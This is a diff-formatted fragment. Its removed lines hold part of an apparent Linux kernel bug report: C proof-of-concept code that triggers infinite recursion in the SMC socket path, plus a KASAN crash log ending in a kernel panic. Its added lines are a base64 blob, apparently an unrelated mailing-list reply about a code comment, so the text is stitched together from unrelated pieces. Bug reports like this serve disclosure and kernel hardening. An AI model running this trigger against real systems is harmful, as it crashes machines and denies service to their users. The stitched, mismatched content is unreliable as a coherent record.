-         printf("succeeded! Unexpected.\n");
-         close(tcp_c); close(smc_a);
-         return 1;
-     }
-     printf("failed: %s\n", strerror(errno));
-
-     /* Step 4: Close TCP C to free the port */
-     printf("[4] Close TCP C to free port %d\n", port);
-     close(tcp_c);
-     sleep(1);
-
-     /* Step 5: listen(A) again → succeeds but ori_af_ops is 
-self-referential */
-     printf("[5] listen(SMC A) again... ");
-     fflush(stdout);
-     ret = listen(smc_a, 5);
-     if (ret < 0) {
-         printf("failed: %s, retrying...\n", strerror(errno));
-         sleep(2);
-         ret = listen(smc_a, 5);
-     }
-     if (ret < 0) {
-         perror("retry"); close(smc_a); return 1;
-     }
-     printf("succeeded! ori_af_ops->syn_recv_sock == 
-smc_tcp_syn_recv_sock\n");
-
-     /* Step 6: TCP connect → smc_tcp_syn_recv_sock recursion → STACK 
-OVERFLOW */
-     printf("[6] TCP connect → triggers infinite recursion...\n");
-     fflush(stdout);
-
-     child = fork();
-     if (child == 0) {
-         client = socket(AF_INET, SOCK_STREAM, 0);
-         if (client < 0) exit(1);
-         memset(&addr, 0, sizeof(addr));
-         addr.sin_family = AF_INET;
-         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
-         addr.sin_port = htons(port);
-         if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
-             perror("connect");
-             exit(1);
-         }
-         sleep(3);
-         close(client);
-         exit(0);
-     }
-
-     printf("Waiting for crash...\n");
-     sleep(5);
-     if (waitpid(child, &status, WNOHANG) == 0) {
-         printf("Child still alive — check dmesg\n");
-         kill(child, SIGKILL);
-         waitpid(child, NULL, 0);
-     }
-     close(smc_a);
-     return 0;
-}
-
-=== Crash Log ===
-
-Linux syzkaller 7.1.0-rc7-gfa471042f07a #1 SMP PREEMPT_DYNAMIC x86_64
-(CONFIG_KASAN=y, CONFIG_SMC=y, CONFIG_DEBUG_LIST=y)
-
-[ 1453.562682][    C0] BUG: IRQ stack guard page was hit at 
-ffffc8ffffffff98 (stack is ffffc90000000000..ffffc90000008000)
-[ 1453.562712][    C0] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
-[ 1453.562733][    C0] CPU: 0 UID: 0 PID: 10840 Comm: poc Not tainted 
-7.1.0-rc7-gfa471042f07a #1 PREEMPT(full)
-[ 1453.562756][    C0] Hardware name: QEMU Standard PC (Q35 + ICH9, 
-2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[ 1453.562767][    C0] RIP: 0010:__lock_acquire+0x417/0x2730
-[ 1453.562965][    C0] Call Trace:
-[ 1453.562970][    C0]  <IRQ>
-[ 1453.562980][    C0]  lock_acquire+0x1ae/0x360
-[ 1453.562995][    C0]  ? smc_tcp_syn_recv_sock+0xab/0xb10
-[ 1453.563031][    C0]  smc_tcp_syn_recv_sock+0xbf/0xb10
-[ 1453.563051][    C0]  ? smc_tcp_syn_recv_sock+0xab/0xb10
-[ 1453.563073][    C0]  ? __pfx_smc_tcp_syn_recv_sock+0x10/0x10
-[ 1453.563114][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.563158][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.563200][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.563244][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-                         [... 15+ recursive frames ...]
-[ 1453.564373][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.564413][    C0]  smc_tcp_syn_recv_sock+0x435/0xb10
-[ 1453.577027][    C0] RIP: 0033:0x423574
-[ 1453.577319][    C0] Kernel panic - not syncing: Fatal exception in 
-interrupt
-
-The infinite recursion is visible in the repeated
-smc_tcp_syn_recv_sock+0x435/0xb10 frames — each iteration calls
-ori_af_ops->syn_recv_sock(), which is itself, pushing a new frame
-until the IRQ stack guard page is hit.
-
-Thanks,
-Xiao
-
-
+SGksDQoNCj4gPg0KPiA+ICAgICAgICAgICAgICAgLyogcHVsbCByeCBwYWNrZXQgdGltZXN0YW1w
+IGlmIGF2YWlsYWJsZSBhbmQgdmFsaWQgKi8NCj4gSXMgdGhpcyBjb21tZW50IHVwLXRvLWRhdGUg
+bm93ID8NCj4gUmV2aWV3ZWQtYnk6IFBpb3RyIEt3YXB1bGluc2tpIDxwaW90ci5rd2FwdWxpbnNr
+aUBpbnRlbC5jb20+DQo+IA0KDQpHb29kIHBvaW50LCAgdGhlIGNvbW1lbnQgZG9lc24ndCBmdWxs
+eSBtYXRjaCB0aGUgY29kZSBhbnltb3JlLiBJJ2xsIHVwZGF0ZSBpdCBpbiB2MyB0bzoNCg0KLyog
+cHVsbCByeCBwYWNrZXQgdGltZXN0YW1wIGlmIGF2YWlsYWJsZSBhbmQgdmFsaWQ7IGl0IGlzIG9u
+bHkNCiAqIHByZXNlbnQgb24gdGhlIGZpcnN0IGJ1ZmZlciBvZiBhIGZyYW1lDQogKi8NCg0KVGhh
+bmtzIGZvciB0aGUgcmV2aWV3Lg0KVGplcmsNCg0K
